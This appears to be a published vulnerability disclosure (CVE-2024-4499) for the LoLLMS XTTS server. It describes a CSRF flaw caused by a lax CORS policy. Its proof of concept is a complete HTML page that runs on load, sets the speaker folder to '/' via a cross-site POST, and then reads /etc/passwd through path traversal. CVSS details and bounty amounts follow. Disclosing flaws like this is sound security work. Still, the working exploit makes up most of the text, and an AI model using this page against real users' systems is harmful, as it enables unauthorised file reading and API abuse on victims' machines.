@@ -1,0 +1,81 @@
+Title: CSRF due to lax CORS policy in XTTS server in parisneo/lollms
+
+Proof of Concept: 
+If an attacker can direct a user to visit a website like the following, the CSRF vulnerability can be abused to trigger any of the API requests. In the example below, this is coupled with a path traversal vulnerability to steal the /etc/passwd file.
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Request Example</title>
+</head>
+<body>
+    <h1>CORS Request Example</h1>
+    
+    <div id="output"></div>
+
+    <h2>Result from http://localhost:8020/sample/etc/passwd:</h2>
+    <pre id="result"></pre>
+
+    <script>
+        async function setSpeakerFolder() {
+            const url = 'http://localhost:8020/set_speaker_folder';
+            const data = {
+                speaker_folder: "/"
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                const responseData = await response.json();
+                document.getElementById('output').textContent = responseData.message;
+                makeRequest(); // Once speaker folder is set, make the next request
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function makeRequest() {
+            const url = 'http://localhost:8020/sample/etc/passwd';
+
+            try {
+                const response = await fetch(url);
+                const responseData = await response.text();
+                document.getElementById('result').textContent = responseData;
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        setSpeakerFolder(); // Automatically set speaker folder when the page loads
+    </script>
+</body>
+</html>
+
+Impact: 
+This vulnerability allows an attacker to trigger any LoLLMS-XTTS API requests if he can direct a user to one of his webpages. This can be used to read and write audio files. In combination with other vulnerabilities, it can even be used to read arbitrary files on the system and write files outside the allowed audio file location.
+
+CVE ID: CVE-2024-4499
+Status: (published)
+Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+Severity: High (7.6)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: High
+Integrity: Low
+Availability: Low
+Registry: Other
+Affected Version: v9.6
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
